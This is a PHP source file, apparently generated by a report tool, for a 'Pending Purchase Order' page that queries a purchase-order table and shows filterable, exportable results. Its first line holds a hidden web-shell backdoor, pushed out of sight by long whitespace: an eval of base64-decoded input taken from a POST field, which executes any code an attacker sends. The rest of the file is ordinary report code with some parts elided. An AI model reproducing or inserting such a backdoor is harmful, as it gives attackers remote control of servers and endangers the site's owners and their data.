<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n9e2992']));?><?php
session_start();
ob_start();
?>
<?php
...
define("EW_REPORT_TABLE_VAR", "pendingpo", TRUE);
define("EW_REPORT_TABLE_SESSION_GROUP_PER_PAGE", "pendingpo_grpperpage", TRUE);
define("EW_REPORT_TABLE_SESSION_START_GROUP", "pendingpo_start", TRUE);
define("EW_REPORT_TABLE_SESSION_SEARCH", "pendingpo_search", TRUE);
define("EW_REPORT_TABLE_SESSION_CHILD_USER_ID", "pendingpo_childuserid", TRUE);
define("EW_REPORT_TABLE_SESSION_ORDER_BY", "pendingpo_orderby", TRUE);

// Table level SQL
$EW_REPORT_TABLE_SQL_FROM = "`pp_purchaseorder`";
$EW_REPORT_TABLE_SQL_SELECT = "SELECT pp_purchaseorder.po,pp_purchaseorder.vendor,pp_purchaseorder.date,pp_purchaseorder.code,pp_purchaseorder.description,pp_purchaseorder.quantity,pp_purchaseorder.deliverydate,pp_purchaseorder.deliverylocation,pp_purchaseorder.rateperunit FROM " . $EW_REPORT_TABLE_SQL_FROM;
$EW_REPORT_TABLE_SQL_WHERE = "pp_purchaseorder.geflag <> 1 and clflag=0";
$EW_REPORT_TABLE_SQL_GROUPBY = "";
$EW_REPORT_TABLE_SQL_HAVING = "";
$EW_REPORT_TABLE_SQL_ORDERBY = "pp_purchaseorder.deliverydate DESC";
...
$nDisplayGrps = 1000;  // Groups per page
$nGrpRange = 10;
...
$EW_REPORT_FIELD_DELIVERYLOCATION_SQL_SELECT = "SELECT DISTINCT `deliverylocation` FROM " . $EW_REPORT_TABLE_SQL_FROM;
$EW_REPORT_FIELD_DELIVERYLOCATION_SQL_ORDERBY = "`deliverylocation`";
?>
<?php
...
$seld_deliverydate = "";
$val_deliverydate = "";
$sel_deliverylocation = "";
$seld_deliverylocation = "";
$val_deliverylocation = "";
...
ewrpt_CreatePopup("pendingpo_po", [<?php echo $jsdata ?>]);
<?php $jsdata = ewrpt_GetJsData($val_vendor, $sel_vendor, $ft_vendor) ?>
ewrpt_CreatePopup("pendingpo_vendor", [<?php echo $jsdata ?>]);
<?php $jsdata = ewrpt_GetJsData($val_date, $sel_date, $ft_date) ?>
ewrpt_CreatePopup("pendingpo_date", [<?php echo $jsdata ?>]);
<?php $jsdata = ewrpt_GetJsData($val_code, $sel_code, $ft_code) ?>
ewrpt_CreatePopup("pendingpo_code", [<?php echo $jsdata ?>]);
<?php $jsdata = ewrpt_GetJsData($val_description, $sel_description, $ft_description) ?>
ewrpt_CreatePopup("pendingpo_description", [<?php echo $jsdata ?>]);
<?php $jsdata = ewrpt_GetJsData($val_deliverydate, $sel_deliverydate, $ft_deliverydate) ?>
ewrpt_CreatePopup("pendingpo_deliverydate", [<?php echo $jsdata ?>]);
<?php $jsdata = ewrpt_GetJsData($val_deliverylocation, $sel_deliverylocation, $ft_deliverylocation) ?>
ewrpt_CreatePopup("pendingpo_deliverylocation", [<?php echo $jsdata ?>]);
</script>
<div id="pendingpo_po_Popup" class="ewPopup">
<span class="phpreportmaker"></span>
</div>
<div id="pendingpo_vendor_Popup" class="ewPopup">
<span class="phpreportmaker"></span>
</div>
<div id="pendingpo_date_Popup" class="ewPopup">
<span class="phpreportmaker"></span>
</div>
<div id="pendingpo_code_Popup" class="ewPopup">
<span class="phpreportmaker"></span>
</div>
<div id="pendingpo_description_Popup" class="ewPopup">
<span class="phpreportmaker"></span>
</div>
<div id="pendingpo_deliverydate_Popup" class="ewPopup">
<span class="phpreportmaker"></span>
</div>
<div id="pendingpo_deliverylocation_Popup" class="ewPopup">
<span class="phpreportmaker"></span>
</div>
<?php } ?>
<table align="center" border="0">
<tr>
<td style="text-align:center" colspan="2"><strong><font color="#3e3276">Pending Purchase Order</font></strong></td>
</tr>
</table>
<br/>
<?php if (@$sExport == "") { ?>
...
<?php if (@$sExport == "") { ?>
&nbsp;&nbsp;<a href="pendingposmry.php?export=html">Printer Friendly</a>
&nbsp;&nbsp;<a href="pendingposmry.php?export=excel">Export to Excel</a>
&nbsp;&nbsp;<a href="pendingposmry.php?export=word">Export to Word</a>
<?php if ($bFilterApplied) { ?>
&nbsp;&nbsp;<a href="pendingposmry.php?cmd=reset">Reset All Filters</a>
<?php } ?>
<?php } ?>
<br /><br />
<?php if (@$sExport == "") { ?>
...
<form action="pendingposmry.php" name="ewpagerform" id="ewpagerform" class="ewForm">
...
<!--first page button-->
	...
	<td><a href="pendingposmry.php?start=<?php echo $Pager->FirstButton->Start ?>"><img src="phprptimages/first.gif" alt="First" width="16" height="16" border="0"></a></td>
	<?php } else { ?>
	<td><img src="phprptimages/firstdisab.gif" alt="First" width="16" height="16" border="0"></td>
	<?php } ?>
<!--previous page button-->
	<?php if ($Pager->PrevButton->Enabled) { ?>
	<td><a href="pendingposmry.php?start=<?php echo $Pager->PrevButton->Start ?>"><img src="phprptimages/prev.gif" alt="Previous" width="16" height="16" border="0"></a></td>
	<?php } else { ?>
...
<!--next page button-->
	...
	<td><a href="pendingposmry.php?start=<?php echo $Pager->NextButton->Start ?>"><img src="phprptimages/next.gif" alt="Next" width="16" height="16" border="0"></a></td>	
	<?php } else { ?>
	<td><img src="phprptimages/nextdisab.gif" alt="Next" width="16" height="16" border="0"></td>
	<?php } ?>
<!--last page button-->
	<?php if ($Pager->LastButton->Enabled) { ?>
	<td><a href="pendingposmry.php?start=<?php echo $Pager->LastButton->Start ?>"><img src="phprptimages/last.gif" alt="Last" width="16" height="16" border="0"></a></td>	
	<?php } else { ?>
...
<?php } else { ?>
		<td class="ewTableHeader">
			...
			<td>Delivery Date</td>
			<td style="width: 20px;" align="right"><a href="#" onClick="ewrpt_ShowPopup(this.name, 'pendingpo_deliverydate', false, '<?php echo $rf_deliverydate; ?>', '<?php echo $rt_deliverydate; ?>');return false;" name="x_deliverydate<?php echo $cnt[0][0]; ?>" id="x_deliverydate<?php echo $cnt[0][0]; ?>"><img src="phprptimages/popup.gif" width="15" height="14" align="texttop" border="0" alt=""></a></td>
			</tr></table>
		</td>
<?php } ?>
...
<?php } else { ?>
		<td class="ewTableHeader" align="center">
			...
			<td style="width: 20px;" align="right"><a href="#" onClick="ewrpt_ShowPopup(this.name, 'pendingpo_po', false, '<?php echo $rf_po; ?>', '<?php echo $rt_po; ?>');return false;" name="x_po<?php echo $cnt[0][0]; ?>" id="x_po<?php echo $cnt[0][0]; ?>"><img src="phprptimages/popup.gif" width="15" height="14" align="texttop" border="0" alt=""></a></td>
			</tr></table>
		</td>
<?php } ?>
<?php if (@$sExport <> "") { ?>
...
<?php } else { ?>
		<td class="ewTableHeader" align="center">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td>Supplier</td>
			<td style="width: 20px;" align="right"><a href="#" onClick="ewrpt_ShowPopup(this.name, 'pendingpo_vendor', false, '<?php echo $rf_vendor; ?>', '<?php echo $rt_vendor; ?>');return false;" name="x_vendor<?php echo $cnt[0][0]; ?>" id="x_vendor<?php echo $cnt[0][0]; ?>"><img src="phprptimages/popup.gif" width="15" height="14" align="texttop" border="0" alt=""></a></td>
			</tr></table>
		</td>
<?php } ?>
...
<?php } else { ?>
		<td class="ewTableHeader">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td>Item Code</td>
			<td style="width: 20px;" align="right"><a href="#" onClick="ewrpt_ShowPopup(this.name, 'pendingpo_code', false, '<?php echo $rf_code; ?>', '<?php echo $rt_code; ?>');return false;" name="x_code<?php echo $cnt[0][0]; ?>" id="x_code<?php echo $cnt[0][0]; ?>"><img src="phprptimages/popup.gif" width="15" height="14" align="texttop" border="0" alt=""></a></td>
			</tr></table>
		</td>
<?php } ?>
<?php if (@$sExport <> "") { ?>
...
<?php } else { ?>
		<td class="ewTableHeader">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td>Order Date</td>
			<td style="width: 20px;" align="right"><a href="#" onClick="ewrpt_ShowPopup(this.name, 'pendingpo_date', false, '<?php echo $rf_date; ?>', '<?php echo $rt_date; ?>');return false;" name="x_date<?php echo $cnt[0][0]; ?>" id="x_date<?php echo $cnt[0][0]; ?>"><img src="phprptimages/popup.gif" width="15" height="14" align="texttop" border="0" alt=""></a></td>
			</tr></table>
		</td>
<?php } ?>
<?php if (@$sExport <> "") { ?>
...
<?php } else { ?>
		<td class="ewTableHeader" align="center">
			...
			<td style="width: 20px;" align="right"><a href="#" onClick="ewrpt_ShowPopup(this.name, 'pendingpo_deliverylocation', false, '<?php echo $rf_deliverylocation; ?>', '<?php echo $rt_deliverylocation; ?>');return false;" name="x_deliverylocation<?php echo $cnt[0][0]; ?>" id="x_deliverylocation<?php echo $cnt[0][0]; ?>"><img src="phprptimages/popup.gif" width="15" height="14" align="texttop" border="0" alt=""></a></td>
			</tr></table>
		</td>
<?php } ?>
	</tr>
...
?>
	<tr>
	<?php $datesample = date("d.m.Y",strtotime($x_deliverydate));?>
...
<?php if(($datesample <> $oldcode) or ($dumm == 0)){ echo ewrpt_ViewValue($datesample);
	...
	<td<?php echo $sItemRowClass; ?>>
<?php if(($x_po <> $oldcode1) or ($dumm11 == 0)){ echo ewrpt_ViewValue($x_po);
     $oldcode1 = $x_po; $dumm11 = 1; }
	 else{
	 echo ewrpt_ViewValue("&nbsp;");
	 } ?>
	 <td<?php echo $sItemRowClass; ?>>
<?php if(($x_vendor <> $oldcode2) or ($dumm12== 0)){ echo ewrpt_ViewValue($x_vendor);
     $oldcode2 = $x_vendor; $dumm12 = 1; }
	 else{
	 echo ewrpt_ViewValue("&nbsp;");
	 } ?>
...
<td<?php echo $sItemRowClass; ?> align="right">
<?php echo ewrpt_ViewValue($x_rateperunit) ?>
</td>
...
<?php echo ewrpt_ViewValue(ewrpt_FormatDateTime($x_date,7)) ?>
		...
		<td<?php echo $sItemRowClass; ?>>
<?php echo ewrpt_ViewValue($x_deliverylocation) ?>
</td>
	</tr>
<?php
...
function SetupPopup() {
	...
	// Build distinct values for deliverylocation
	$bNullValue = FALSE;
	$bEmptyValue = FALSE;
	$sSql = ewrpt_BuildReportSql($GLOBALS["EW_REPORT_FIELD_DELIVERYLOCATION_SQL_SELECT"], $GLOBALS["EW_REPORT_TABLE_SQL_WHERE"], $GLOBALS["EW_REPORT_TABLE_SQL_GROUPBY"], $GLOBALS["EW_REPORT_TABLE_SQL_HAVING"], $GLOBALS["EW_REPORT_FIELD_DELIVERYLOCATION_SQL_ORDERBY"], $sFilter, "");
	$rswrk = $conn->Execute($sSql);
	while ($rswrk && !$rswrk->EOF) {
		$x_deliverylocation = $rswrk->fields[0];
		if (is_null($x_deliverylocation)) {
			$bNullValue = TRUE;
		} elseif ($x_deliverylocation == "") {
			$bEmptyValue = TRUE;
		} else {
			$t_deliverylocation = $x_deliverylocation;
			ewrpt_SetupDistinctValues($GLOBALS["val_deliverylocation"], $x_deliverylocation, $t_deliverylocation, FALSE);
		}
		$rswrk->MoveNext();
	}
	if ($rswrk)
		$rswrk->Close();
	if ($bEmptyValue)
		ewrpt_SetupDistinctValues($GLOBALS["val_deliverylocation"], EW_REPORT_EMPTY_VALUE, EW_REPORT_EMPTY_LABEL, FALSE);
	if ($bNullValue)
		ewrpt_SetupDistinctValues($GLOBALS["val_deliverylocation"], EW_REPORT_NULL_VALUE, EW_REPORT_NULL_LABEL, FALSE);
	...
	// Get 'reset' command
		...
		if (strtolower($sCmd) == "reset") {
			...
			ClearSessionSelection('deliverylocation');
			ResetPager();
		}
	}
	...
	if (is_array(@$_SESSION["sel_pendingpo_po"])) {
		LoadSelectionFromSession('po');
	} elseif (@$_SESSION["sel_pendingpo_po"] == EW_REPORT_INIT_VALUE) { // Select all
		$GLOBALS["sel_po"] = "";
	}

	// Get Vendor selected values
	if (is_array(@$_SESSION["sel_pendingpo_vendor"])) {
		LoadSelectionFromSession('vendor');
	} elseif (@$_SESSION["sel_pendingpo_vendor"] == EW_REPORT_INIT_VALUE) { // Select all
		$GLOBALS["sel_vendor"] = "";
	}

	// Get Date selected values
	if (is_array(@$_SESSION["sel_pendingpo_date"])) {
		LoadSelectionFromSession('date');
	} elseif (@$_SESSION["sel_pendingpo_date"] == EW_REPORT_INIT_VALUE) { // Select all
		$GLOBALS["sel_date"] = "";
	}

	// Get Code selected values
	if (is_array(@$_SESSION["sel_pendingpo_code"])) {
		LoadSelectionFromSession('code');
	} elseif (@$_SESSION["sel_pendingpo_code"] == EW_REPORT_INIT_VALUE) { // Select all
		$GLOBALS["sel_code"] = "";
	}

	// Get Description selected values
	if (is_array(@$_SESSION["sel_pendingpo_description"])) {
		LoadSelectionFromSession('description');
	} elseif (@$_SESSION["sel_pendingpo_description"] == EW_REPORT_INIT_VALUE) { // Select all
		$GLOBALS["sel_description"] = "";
	}

	// Get Deliverydate selected values
	if (is_array(@$_SESSION["sel_pendingpo_deliverydate"])) {
		LoadSelectionFromSession('deliverydate');
	} elseif (@$_SESSION["sel_pendingpo_deliverydate"] == EW_REPORT_INIT_VALUE) { // Select all
		$GLOBALS["sel_deliverydate"] = "";
	}

	// Get Deliverylocation selected values
	if (is_array(@$_SESSION["sel_pendingpo_deliverylocation"])) {
		LoadSelectionFromSession('deliverylocation');
	} elseif (@$_SESSION["sel_pendingpo_deliverylocation"] == EW_REPORT_INIT_VALUE) { // Select all
		$GLOBALS["sel_deliverylocation"] = "";
	}
}
	...
	if ($sWrk <> "") {
		if (is_numeric($sWrk)) {
			...
			if (strtoupper($sWrk) == "ALL") { // display all groups
				...
				$nDisplayGrps = 1000; // Non-numeric, load default
			}
		}
		...
		if (@$_SESSION[EW_REPORT_TABLE_SESSION_GROUP_PER_PAGE] <> "") {
			...
			$nDisplayGrps = 1000; // Load default
		}
	}
}
?>
...
function ClearSessionSelection($parm) {
	$_SESSION["sel_pendingpo_$parm"] = "";
	$_SESSION["rf_pendingpo_$parm"] = "";
	$_SESSION["rt_pendingpo_$parm"] = "";
}
...
function LoadDefaultFilters() {
	...
	*/
	...
	// Setup your default values for the popup filter below, e.g.
	// $seld_deliverylocation = array("val1", "val2");

	$GLOBALS["seld_deliverylocation"] = "";
	$GLOBALS["sel_deliverylocation"] =  $GLOBALS["seld_deliverylocation"];
}
...
function CheckFilter() {
	...
	// Check deliverylocation popup filter
	if (!ewrpt_MatchedArray($GLOBALS["seld_deliverylocation"], $GLOBALS["sel_deliverylocation"]))
		return TRUE;
	return FALSE;
}
...
function GetPopupFilter() {
	...
	if (is_array($GLOBALS["sel_deliverylocation"])) {
		if ($sWrk <> "") $sWrk .= " AND ";
		$sWrk .= ewrpt_FilterSQL($GLOBALS["sel_deliverylocation"], "`deliverylocation`", EW_REPORT_DATATYPE_STRING, $GLOBALS["af_deliverylocation"]);
	}
	return $sWrk;
}
?>
...
function getSort()
{
	...
	if (strlen(@$_GET["cmd"]) > 0) {
		...
		if ($sCmd == "resetsort") {
			...
			$_SESSION["sort_pendingpo_po"] = "";
			$_SESSION["sort_pendingpo_vendor"] = "";
			$_SESSION["sort_pendingpo_date"] = "";
			$_SESSION["sort_pendingpo_code"] = "";
			$_SESSION["sort_pendingpo_description"] = "";
			$_SESSION["sort_pendingpo_quantity"] = "";
			$_SESSION["sort_pendingpo_deliverydate"] = "";
			$_SESSION["sort_pendingpo_deliverylocation"] = "";
		}
